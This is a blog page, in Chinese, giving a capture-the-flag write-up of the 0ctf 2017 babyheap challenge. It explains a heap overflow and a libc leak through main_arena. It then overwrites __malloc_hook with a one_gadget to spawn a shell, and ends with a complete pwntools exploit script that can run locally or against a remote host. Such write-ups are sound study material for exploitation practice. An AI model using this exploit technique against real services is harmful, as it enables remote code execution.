@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>0ctf_2017_babyheap - Limu&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="分析题目题目提供了libc 的版本，因为我使用的是archlinux系统，使用的musl的libc，没有适合的ld加载，所以去glibc-all-in-one中下载了合适的glibc并且进行编译,然后使用patchelf更换libc和ld。        丢进Ghidra中，看一下伪代码（没有加载出函数名，找到__libc_start_main找到main函数），发现在Fill选项调用的函数处，存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf_2017_babyheap">
+<meta property="og:url" content="https://limu.ltd/2023/03/14/0ctf_2017_babyheap/index.html">
+<meta property="og:site_name" content="Limu&#39;s Blog">
+<meta property="og:description" content="分析题目题目提供了libc 的版本，因为我使用的是archlinux系统，使用的musl的libc，没有适合的ld加载，所以去glibc-all-in-one中下载了合适的glibc并且进行编译,然后使用patchelf更换libc和ld。        丢进Ghidra中，看一下伪代码（没有加载出函数名，找到__libc_start_main找到main函数），发现在Fill选项调用的函数处，存">
+<meta property="og:locale">
+<meta property="og:image" content="https://limu.ltd/images/0ctf_2017_babyheap/1.png">
+<meta property="og:image" content="https://limu.ltd/images/0ctf_2017_babyheap/2.png">
+<meta property="og:image" content="https://limu.ltd/images/0ctf_2017_babyheap/3.png">
+<meta property="og:image" content="https://limu.ltd/images/0ctf_2017_babyheap/4.png">
+<meta property="article:published_time" content="2023-03-14T06:11:03.000Z">
+<meta property="article:modified_time" content="2023-03-14T12:56:14.000Z">
+<meta property="article:author" content="Limu">
+<meta property="article:tag" content="CTF刷题记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://limu.ltd/images/0ctf_2017_babyheap/1.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1685348109774">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1685348109774">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1685348109774">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(/images/1.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="Limu" class="mdui-btn mdui-btn-icon"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Limu"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Limu">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Limu" alt="Limu">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>10</div>
+        <div><span>Tags</span>3</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/50648378"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/limu520/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 20px;">CTF刷题记录</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/%E6%9D%82%E8%AE%B0/" style="font-size: 10px;">杂记</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(3);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">10</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/29/SWPUCTF-2019/">SWPUCTF_2019</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/19/qemu-iot/">Qemu-mips环境配置</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/zctf-2016-note3/">zctf_2016_note3</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/09/hitcon-2018-children-tcache/">hitcon_2018_children_tcache</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/07/lctf-2016/">lctf_2016</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 Limu
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <a href=”http://www.beian.miit.gov.cn”>鲁ICP备2022012729号</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="/images/0ctf_2017_babyheap/0.jpg" alt="0ctf_2017_babyheap" loading="lazy">
+            <h1>0ctf_2017_babyheap</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年03月14日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>题目提供了libc 的版本，因为我使用的是archlinux系统，使用的musl的libc，没有适合的ld加载，所以去glibc-all-in-one中下载了合适的glibc并且进行编译,然后使用patchelf更换libc和ld。    </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/0ctf_2017_babyheap/1.png" alt="文件架构及ld加载情况" data-caption="文件架构及ld加载情况" loading="lazy">  </p>
+<p>丢进Ghidra中，看一下伪代码（没有加载出函数名，找到__libc_start_main找到main函数），发现在Fill选项调用的函数处，存在无限制任意写大小长度的问题，可以考虑溢出堆块。   </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/0ctf_2017_babyheap/2.png" alt="Fill函数伪代码" data-caption="Fill函数伪代码" loading="lazy">  </p>
+<p>使用Gdb进行调试的时候，我们发现了程序中存在alarm函数，所以我们打开hex编辑器，找到对应的位置，当然也可以搜索E8EBFEFFFF，更换为NOP（0x90），方便进行gdb的动态调试。   </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/0ctf_2017_babyheap/3.png" alt="alarm函数位置" data-caption="alarm函数位置" loading="lazy"></p>
+<p>为了方便测试，我们先把调用函数写出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def add(size):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Size: &quot;,str(size).encode())</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    p.sendlineafter(&quot;Size: &quot;,str(size).encode())</span><br><span class="line">    p.sendlineafter(&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index).encode())</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index).encode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>首先建立两个fast chunk和一个small chunk，释放第三个chunk，写入第一个chunk溢出到第二个chunk后，修改第二个chunk的大小，使之能够泄露出第三个chunk指向的main_arena的地址(不是main_arena的初始地址，是main_arena+0x58的地址，对应small_bin的位置)，然后根据已知libc中main_arena的相对偏移，获取程序的基址。</p>
+<p>然后，通过建立fake_chunk，我们修改__malloc_hook的位置的值为one_gadget地址，然后我们再创建一个chunk，就可以获取shell。  </p>
+<h2 id="出现的问题及解决方案"><a href="#出现的问题及解决方案" class="headerlink" title="出现的问题及解决方案"></a>出现的问题及解决方案</h2><p>1、我使用的libc和提供的libc的main_arena的偏移量不同，需要修改。  </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/0ctf_2017_babyheap/4.png" alt="main_arena的偏移量" data-caption="main_arena的偏移量" loading="lazy"></p>
+<p>2、程序使用的alloc，跟malloc存在一部分的区别，malloc创建chunk后不会清空chunk的内容，而alloc会，所以，第三个创建的small_chunk需要重新修复。</p>
+<p>3、关于fake_chunk,我们可以理解为在要修改的位置，创建一个包含它的chunk。这里我们可以利用small_bin的双链表，修改fd和bk的值，伪造一个bin，然后我们再malloc一下，在chunk内实现任意写，成功修改目标地址。  </p>
+<h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">##Author by: limu</span><br><span class="line">##Terminal: i3</span><br><span class="line">##Tools: pwntools</span><br><span class="line">##Usage: python3 exp.py [local or remote] [yes or no] ip port</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#from pwnlib import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;i3-sensible-terminal&#x27;,&quot;-e&quot;]</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&quot;./libc64.so.6&quot;)</span><br><span class="line">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &#x27;l&#x27;:</span><br><span class="line">    p = process(&quot;./pwn&quot;)</span><br><span class="line">    </span><br><span class="line">elif sys.argv[1] == &#x27;r&#x27;:</span><br><span class="line">    p = remote(sys.argv[3],sys.argv[4])</span><br><span class="line">    </span><br><span class="line">else: </span><br><span class="line">    print(&quot;wrong&quot;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">##启动调试</span><br><span class="line">if sys.argv[2] == &#x27;y&#x27;:</span><br><span class="line">    gdb.attach(p,gdbscript=&#x27;break main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Size: &quot;,str(size).encode())</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    p.sendlineafter(&quot;Size: &quot;,str(size).encode())</span><br><span class="line">    p.sendlineafter(&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index).encode())</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;Command: &quot;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index).encode())</span><br><span class="line"></span><br><span class="line">add(0x10) #0</span><br><span class="line">add(0x10) #1</span><br><span class="line">add(0x80) #2</span><br><span class="line"></span><br><span class="line">add(0x30) #3</span><br><span class="line">add(0x68) #4</span><br><span class="line">add(0x10) #5 防止合并top_chunk</span><br><span class="line"></span><br><span class="line">edit(0,0x20,b&#x27;a&#x27;*0x10+p64(0x0)+p64(0x41))</span><br><span class="line">edit(2,0x20,p64(0x0)*3+p64(0x71))</span><br><span class="line">delete(1)</span><br><span class="line">add(0x30) #1</span><br><span class="line">edit(1,0x20,p64(0x0)*3+p64(0x91)) ##修复chunk</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">one = 0x4525a</span><br><span class="line">p.recvuntil(b&quot;\x91&quot; + b&#x27;\x00&#x27; * 7)</span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">base_addr = leak_addr - (0x3c3b20 + 0x58)</span><br><span class="line">print(hex(base_addr))</span><br><span class="line">malloc_hook = libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">one_gadget = base_addr  + one</span><br><span class="line">fakefd = base_addr + malloc_hook - 0x23</span><br><span class="line">print(hex(fakefd))</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">edit(3,0x48,p64(0)*7+p64(0x71)+p64(fakefd))</span><br><span class="line">add(0x68) #2</span><br><span class="line">add(0x68) #4</span><br><span class="line"></span><br><span class="line">print(hex(one_gadget))</span><br><span class="line">edit(4,0x1b,b&#x27;\x00&#x27;*0x13+p64(one_gadget))</span><br><span class="line"> </span><br><span class="line">add(0x10)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>Limu<br>
+        <strong>Link：</strong><a href="https://limu.ltd/2023/03/14/0ctf_2017_babyheap/" title="https:&#x2F;&#x2F;limu.ltd&#x2F;2023&#x2F;03&#x2F;14&#x2F;0ctf_2017_babyheap&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;limu.ltd&#x2F;2023&#x2F;03&#x2F;14&#x2F;0ctf_2017_babyheap&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">CTF刷题记录</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">分析题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">3.</span> <span class="toc-text">出现的问题及解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP"><span class="toc-number">4.</span> <span class="toc-text">最终EXP</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1685348109780"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
